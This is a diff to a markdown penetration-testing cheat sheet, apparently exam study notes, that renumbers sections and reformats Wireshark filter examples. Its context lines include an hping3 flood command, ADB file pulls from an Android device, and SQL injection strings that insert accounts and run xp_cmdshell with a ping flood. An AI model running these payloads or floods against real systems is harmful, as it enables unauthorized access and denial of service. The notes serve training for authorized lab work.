@@ -1,4 +1,4 @@
-## Footprinting and Reconnaissance
+## 2)Footprinting and Reconnaissance
 <details>
     <summary> Reconnasiance/Footprinting</summary>
 <details>
@@ -94,7 +94,7 @@ $ run
 </details>
 </details>
 
-## Scanning Networks
+## 3)Scanning Networks
 <details>
     <summary>Scanning Networks</summary
 - Port Scanning using Hping3:
@@ -131,11 +131,11 @@ hping3 10.10.10.10 --flood
 </details>
 
 
-## Enumeration
+## 4)Enumeration
 <details>
     <summary>Enumeration</summary>
 
- ### 1) NetBios Enumeration
+###  1) NetBios Enumeration
 #### Tool: Global Network Inventory
 - Audit Scan Mode >> Select IP range >> Authentication setting >> connect as windows 12(victim) server using credentials that is currently logged on
 - The Scan Summary tab displays a brief summary of machine that has been scanned. It will shows you the Machine name, MAC Address, OS installed, and etc.
@@ -161,7 +161,7 @@ hping3 10.10.10.10 --flood
 - select different nodes to view their information
 - Users, Services, User Rights, Scheduled jobs
 
- ### 5) SMB ENumeration
+### 5) SMB ENumeration
 #### Tools: nbstat,nmap
 
 - In windows 12
@@ -193,7 +193,7 @@ net use // session with name e would have been created
 
 </details>
 
-## Vulberability Analysis
+## 5) Vulberability Analysis
 <details>
     <summary>Vulnerability Analysis</summary>
 
@@ -209,10 +209,12 @@ nikto -h url -Cgidirs all
 ```
 </details>
 
-## Android Hacking
+## 17) Android Hacking
 <details>
-    <summary>ADB</summary>
+    <summary>Android Hacking</summary>
+
     
+### ADB
 ```bash
 netdiscover -r xx.xx.xx.xx/24
 nmap -O xx.xx.xx.4
@@ -234,14 +236,19 @@ cd
 ls
 echo
 ```
+
 #### Download a File from Android using ADB tool
 ```bash
 adb pull /sdcard/log.txt C:
 adb pull sdcard/log. txt /home/murphy/Desktop
 ```
+
+### Phonesploit
+- Refer README.md
+  
 </details>
 
-## SQL Injection
+## 15) SQL Injection
 
 <details>
     <summary>SQL Injection</summary>
@@ -274,11 +281,11 @@ blah';insert into login values ('john','apple123');
 Create database from login
 blah';create database mydatabase;
 Execute cmd from login
-blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- 
 ```
 </details>
 
-# 8) Sniffing
+## 8) Sniffing
 <details>
     <summary> Wireshark</summary>
       - Some useful wireshark command 
@@ -286,34 +293,37 @@ blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 filter : http
 option --> find packet->> select string --> pwd  // to find pwd string in packets
 ```
+=======================================================================================================================================================================
+- Sets a filter for any packet that has x.x.x.x as the source or destination IP address. This is very useful if, let’s say, you want to analyze specific traffic. Applying this filter helps you analyze outgoing traffic to see which one matches the IP or source you’re looking for.
+```
 ip.addr == x.x.x.x
-
-Sets a filter for any packet that has x.x.x.x as the source or destination IP address. This is very useful if, let’s say, you want to analyze specific traffic. Applying this filter helps you analyze outgoing traffic to see which one matches the IP or source you’re looking for. 
-You can also choose to use ip.dst == x.x.x.x to filter only by destination or ip.src == x.x.x.x to filter by source.
+``` 
  
+- You can also choose to use ``` ip.dst == x.x.x.x```  to filter only by destination or ``` ip.src == x.x.x.x ``` to filter by source.
+ 
+- Sets a conversation filter between two specific IP addresses. This one helps you check the data between two specific hosts or networks. It helps you when you are looking for specific data, so you don’t have to go through others that don’t interest you. 
+ ```
 ip.addr == x.x.x.x && ip.addr == x.x.x.x 
 
 (or ip.src == xxxx && ip.dst == xxxx - for a destination)
-
-Sets a conversation filter between two specific IP addresses. This one helps you check the data between two specific hosts or networks. It helps you when you are looking for specific data, so you don’t have to go through others that don’t interest you.
-
- 
-
-http or dns
+``` 
 
 Sets a filter to display all http and dns protocols. It lets you narrow down to the exact protocol you need. So, if you need to track down an odd FTP traffic, then you just have to set it for ‘ftp’. Want to find out why some websites don’t appear? You just have to set it to ‘dns’.
+```
+http or dns
+```
 
- 
 
 tcp.port==xxx
 
 Sets filters for any TCP packet with a specific source or destination port. Sometimes is just useful and less time consuming to look only at the traffic that goes into or out of a specific port.
 
  
-
+- Sets filters to display all TCP resets. All packets have a TCP, if this is set to 1, it tells the receiving computer that it should at once stop using that connection. So, this filter is a powerful one, being that a TCP reset kills a TCP connection immediately.
+- 
 tcp.flags.reset==1
 
-Sets filters to display all TCP resets. All packets have a TCP, if this is set to 1, it tells the receiving computer that it should at once stop using that connection. So, this filter is a powerful one, being that a TCP reset kills a TCP connection immediately.
+
 
  
 
@@ -322,7 +332,7 @@ tcp contains xxx
 It’s a filter that displays all TCP packets that contain a certain term (instead of xxx, use what term you’re looking for). For example, if you are looking for a specific term appearing in the packet, this filter is what you need.
 
  
-Follows a tcp stream.
+- Follows a tcp stream.
 ```
 tcp.stream eq X
 ```
@@ -355,7 +365,9 @@ udp contains xx:xx:xx
 
  
 - Indicates which dns requests couldn't be correctly resolved.
- ``` dns.flags.rcode != 0 ```
+ ```
+dns.flags.rcode != 0
+ ```
 
 </details>
 
@@ -476,7 +488,7 @@ set timeout 20000 //rest as shown in option
 </details>
 
 
-# Host DIscovery
+## Host DIscovery
 <details>
     <summary>Hsot Discover</summary>
 ```
@@ -508,4 +520,9 @@ the default credentials of an OT system It lists information such as product cod
 - #### Other Tools
       - Nessus
       - wireshark
+</details>
+
+## Cryptography
+<details>
+    <summary>Cryptography</summary>
 </details>
